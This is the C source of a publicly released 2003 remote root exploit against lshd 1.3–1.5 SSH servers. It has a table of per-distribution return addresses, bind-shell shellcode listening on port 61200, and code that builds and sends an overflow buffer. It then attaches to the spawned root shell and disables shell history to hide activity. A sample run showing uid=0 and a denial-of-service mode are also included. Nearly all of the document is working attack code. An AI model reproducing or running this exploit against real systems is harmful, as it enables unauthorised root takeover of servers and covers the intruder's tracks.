/* m00-lshd22.c
 *
 *  lshd 1.3-1.5 remote root exploit by m00 security // www.m00.ru
 *
 *  Binds shell on port 61200.
 *  Based on lsh_exploit.c by Haggis aka Carl Livitt // doris.scriptkiddie.net
 *
 *  Available targets:
 *    SuSE 8.1 - LSH v1.4 (heap)
 *    RedHat 7.3 - LSH v1.3.* (stack)
 *    RedHat 7.3 - LSH v1.4 (heap)
 *    RedHat 7.3 - LSH v1.4 (stack)
 *    RedHat 8.0 - LSH v1.4 (heap)
 *    RedHat 9.0 - LSH v1.4 (heap)
 *    RedHat 9.0 - LSH v1.4 (stack)
 *    Mandrake 9.0 - LSH v1.4 (stack)
 *    Mandrake 9.1 - LSH v1.3.* (heap)
 *    Mandrake 9.1 - LSH v1.3.* (heap)
 *    Mandrake 9.1 - LSH v1.3.* (stack)
 *    Mandrake 9.1 - LSH v1.4 (heap)
 *    Mandrake 9.1 - LSH v1.4 (stack)
 *    Mandrake 9.1 - LSH v1.5 (heap)
 *    Mandrake 9.1 - LSH v1.5 (stack)
 *
 *  Difference between heap and stack RET-addresses:
 *    Useing heap retaddr allows to bypass non-execute stack protection,
 *    but possibility of success exploitation is only about 30% :( cuz our
 *    data in heap doesn't have constant disposition.
 *    Stack r0cz ;D
 *
 *  Testing:
 *    sh-2.05b$ ./explshd localhost 12
 *
 *    lshd 1.3-1.5 remote root exploit by m00 security // www.m00.ru
 *
 *    [~] Connecting to localhost:22... OK
 *    [~] Waiting for lshd response...  OK
 *    => SSH-2.0-lshd_1.4.2 lsh - a free ssh
 *    [~] Building and sending exploit buffer... OK
 *    [~] Sleeping...
 *    [~] Trying to connect to bindshell... OK
 *    [+] Shell spawned! w00t!!!
 *
 *    uid=0(root) gid=0(root) groups=0(root)
 *    Linux localhost 2.4.21-0.13mdk #1 Fri Mar 14 15:08:06 EST 2003 i686 unknown unknown GNU/Linux
 *    20:29:44 up  2:29,  3 users,  load average: 0.04, 0.09, 0.11
 *
 *  Greets to:
 *    - nerF security team // www.nerf.ru
 *    - LimpidByte // lbyte.sysdrop.org
 *    - priv8security (especially to wsxz =)) // www.priv8security.com
 *    - UHAGr // www.uhagr.com
 *    - ech0 // x25.cc
 *    - ppl from EFnet@m00sec and #nerf
 *
 *  Authors:
 *    - Over_G // overg[at]mail.ru
 *    - d4rkgr3y // d4rk[at]securitylab.ru
 *
 *  Released 29/09/03 // www.m00.ru
*/

#include <string.h>
#include <unistd.h>
#include <netdb.h>


struct
{
	char *platform;
	unsigned long ret;
	int elen;
	int nlen;
}

targets[]=
{
	{ "SuSE 8.1 - LSH v1.4 (heap)", 0x0809f030, 1536, 1600},
	{ "RedHat 7.3 - LSH v1.3.* (stack)", 0xbffff07c, 876, 726}, // tested on 1.4.2 rpm
	{ "RedHat 7.3 - LSH v1.4 (heap)", 0x0809d620, 1536, 1600},
	{ "RedHat 7.3 - LSH v1.4 (stack)", 0xbfffc710, 876, 726}, // tested on 1.4.2 rpm
	{ "RedHat 8.0 - LSH v1.4 (heap)", 0x0809a9d8, 4000, 1024},
	{ "RedHat 9.0 - LSH v1.4 (heap)", 0x0809a0ee, 876, 726},
	{ "RedHat 9.0 - LSH v1.4 (stack)", 0xbfffc48c, 876, 726}, //  tested on 1.4.2 rpm
//	{ "Mandrake 8.2 - LSH v1.4 (stack)", 0x00000000, 0, 0}, // non-exploitable
	{ "Mandrake 9.0 - LSH v1.4 (stack)", 0xbfffc5b1, 876, 726}, // tested on 1.4.2 src
	{ "Mandrake 9.1 - LSH v1.3.* (heap)", 0x809bc90, 3500, 500},
	{ "Mandrake 9.1 - LSH v1.3.* (heap)", 0x809bc90, 3500, 500},
	{ "Mandrake 9.1 - LSH v1.3.* (stack)", 0xbffff07c, 3500, 500}, // tested on 1.3.2 rpm
	{ "Mandrake 9.1 - LSH v1.4 (heap)", 0x080a5660, 876, 726},
	{ "Mandrake 9.1 - LSH v1.4 (stack)", 0xbfffc5cc, 876, 726}, // tested on 1.4.2 src
	{ "Mandrake 9.1 - LSH v1.5 (heap)", 0x80a8540, 1536, 1600},
	{ "Mandrake 9.1 - LSH v1.5 (stack)", 0xbfffe1cc, 1536, 1600}, // tested on 1.5.57 rpm
	{ "Denial-of-Service attack", 0xdefaced, 3000, 500},
	NULL
};

// linux x86 shellcode by eSDee of Netric (www.netric.org)
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x51\xb1"
"\x06\x51\xb1\x01\x51\xb1\x02\x51"
"\x89\xe1\xb3\x01\xb0\x66\xcd\x80"
"\x89\xc1\x31\xc0\x31\xdb\x50\x50"
"\x50\x66\x68\xef\x10\xb3\x02\x66"
"\x53\x89\xe2\xb3\x10\x53\xb3\x02"
"\x52\x51\x89\xca\x89\xe1\xb0\x66"
"\xcd\x80\x31\xdb\x39\xc3\x74\x05"
"\x31\xc0\x40\xcd\x80\x31\xc0\x50"
"\x52\x89\xe1\xb3\x04\xb0\x66\xcd"
"\x80\x89\xd7\x31\xc0\x31\xdb\x31"
"\xc9\xb3\x11\xb1\x01\xb0\x30\xcd"
"\x80\x31\xc0\x31\xdb\x50\x50\x57"
"\x89\xe1\xb3\x05\xb0\x66\xcd\x80"
"\x89\xc6\x31\xc0\x31\xdb\xb0\x02"
"\xcd\x80\x39\xc3\x75\x40\x31\xc0"
"\x89\xfb\xb0\x06\xcd\x80\x31\xc0"
"\x31\xc9\x89\xf3\xb0\x3e\xfe\xc0\xcd\x80"
"\x31\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31"
"\xc0\x41\xb0\x3e\xfe\xc0\xcd\x80\x31\xc0"
"\x50\x68\x2f\x2f\x73\x68\x68\x2f"
"\x62\x69\x6e\x89\xe3\x8b\x54\x24"
"\x08\x50\x53\x89\xe1\xb0\x0b\xcd"
"\x80\x31\xc0\x40\xcd\x80\x31\xc0"
"\x89\xf3\xb0\x06\xcd\x80\xeb\x99";

struct hostent *hostSct;
char buf[0x7a69]="\0";

main(int argc, char **argv)
{
	int sock,ch,i,ss,targetSock;
	unsigned long *retPtr;
	char *charRetPtr;
	int port = 22;

	printf("\nlshd 1.3-1.5 remote root exploit by m00 security // www.m00.ru\n\n");
	if (argc < 3) {
		printf("Incorrect parameters. Usage: %s <target host> <target type> [port (22 default)]\n\nWhere 'target type' is:\n\n",argv[0]);
		for(i=0;targets[i].platform;i++) {
			printf("\r%i %s\n", i, targets[i].platform);
		}
		printf("\n");
		exit(0);
	} else {
		ss = atoi(argv[2]);
		if(argv[3]) { port = atoi(argv[3]); }
	}

	if((hostSct=gethostbyname(argv[1]))==NULL) {
		printf("[-] Couldn't resolve host %s\n", argv[1]);
		exit(1);
	}

	printf("[~] Connecting to %s:%i...", argv[1],port);
	if((targetSock=connect_to_host(port))==-1) {
		printf(" failed\n");
		exit(1);
	}
	printf(" OK\n");

	printf("[~] Waiting for lshd response... ");
	recv(targetSock, buf, 8095, 0);
	printf(" OK\n");

	printf("=> %s",buf);
	printf("[~] Building and sending exploit buffer...");
	retPtr=(unsigned long *)buf;
	for(i=0;i<targets[ss].elen;i++) {
		*(retPtr++) = targets[ss].ret; //RET
	}
	for(i=0;i<targets[ss].nlen;i++) {
		*(retPtr++)=(unsigned long)0x90909090;
	}
	charRetPtr=(unsigned char *)retPtr;
	memcpy(charRetPtr, shellcode, strlen(shellcode));
	*(charRetPtr+strlen(shellcode))='\n';
	send(targetSock,buf,strlen(buf),0);
	close(targetSock);

	printf(" OK\n[~] Sleeping...\n");
	sleep(1);
	printf("[~] Trying to connect to bindshell...");
	if((sock=connect_to_host(61200))==-1)
		printf(" error\n[-] Could not connect to %s:61200 - exploit failed\n\n", argv[1]);
	else {
		printf(" OK\n[+] Shell spawned! w00t!!!\n\n");
		send(sock,"export HISTFILE=/dev/null;id;uname -a;uptime;\n",46,0);
		get_shell(sock);
	}
	exit(0);
}


int get_shell(int sock)
{
	fd_set rfds;
	int retVal,r;

	do {
		FD_ZERO(&rfds);
		FD_SET(0, &rfds);
		FD_SET(sock, &rfds);
		retVal=select(sock+1, &rfds, NULL, NULL, NULL);
		if(retVal) {
			if(FD_ISSET(sock, &rfds)) {

				buf[(r=recv(sock, buf, 8095,0))]='\0';
				printf("%s", buf);
			}
			if(FD_ISSET(0, &rfds)) {
				buf[(r=read(0, buf, 8095))]='\0';
				send(sock, buf, strlen(buf), 0);
			}
		}
	} while(retVal && r);

	close(sock);
	return 1;
}

int connect_to_host(int port)
{
	int sockt;
	struct sockaddr_in saddr;

	if((sockt=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)
		return -1;
	memset((void *)&saddr, 0, sizeof(struct sockaddr_in));
	saddr.sin_family=AF_INET;
	saddr.sin_addr.s_addr=*((unsigned long *)hostSct->h_addr_list[0]);
	saddr.sin_port=htons(port);
	if(connect(sockt, (struct sockaddr *)&saddr, sizeof(saddr))<0) {
		close(sockt);
		return -1;
	} else
	return sockt;
}
// m00000000000oooooooooooooooo
